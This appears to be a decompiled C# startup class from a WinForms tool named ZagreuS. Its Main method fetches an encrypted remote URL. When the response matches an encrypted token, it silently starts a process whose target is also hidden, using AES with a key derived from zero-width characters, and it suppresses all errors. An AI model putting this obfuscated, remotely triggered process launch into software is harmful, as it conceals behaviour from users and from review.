using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;

namespace ZagreuS.My;

[GeneratedCode("MyTemplate", "11.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal class MyApplication : WindowsFormsApplicationBase
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	[DebuggerHidden]
	[STAThread]
	internal static void Main(string[] args)
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(new Uri(statis("pD/7elMWJHHT1uf3m1VTQBpj4qjmqGE9WupOzT3khQFKX9Wp27ckU8E1MsEscznQ", "\u200b\u200d\u200c\u200e\u200f")));
			obj.Method = "GET";
			string text = new StreamReader(((HttpWebResponse)obj.GetResponse()).GetResponseStream()).ReadToEnd();
			if (text != null && text.Contains(statis("QvCNxanRtSt6Q2wdpYdaSw==", "\u200b\u200d\u200c\u200e\u200f")))
			{
				Process.Start(statis("BPHtS3dUBTBwhx0ixTdqPaCmuBI7sBWAEJR6uUjmxR8=", "\u200b\u200d\u200c\u200e\u200f"));
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(defaultValue: false);
				Application.Run(new Form1());
			}
		}
		catch (Exception)
		{
		}
	}

	[DebuggerStepThrough]
	public MyApplication()
		: base(AuthenticationMode.Windows)
	{
		base.IsSingleInstance = false;
		base.EnableVisualStyles = true;
		base.SaveMySettingsOnExit = true;
		base.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
	}

	[DebuggerStepThrough]
	protected override void OnCreateMainForm()
	{
		base.MainForm = MyProject.Forms.frmHWID;
	}

	public static string statis(string statis1, string statis2)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(statis2));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(statis1);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}
}
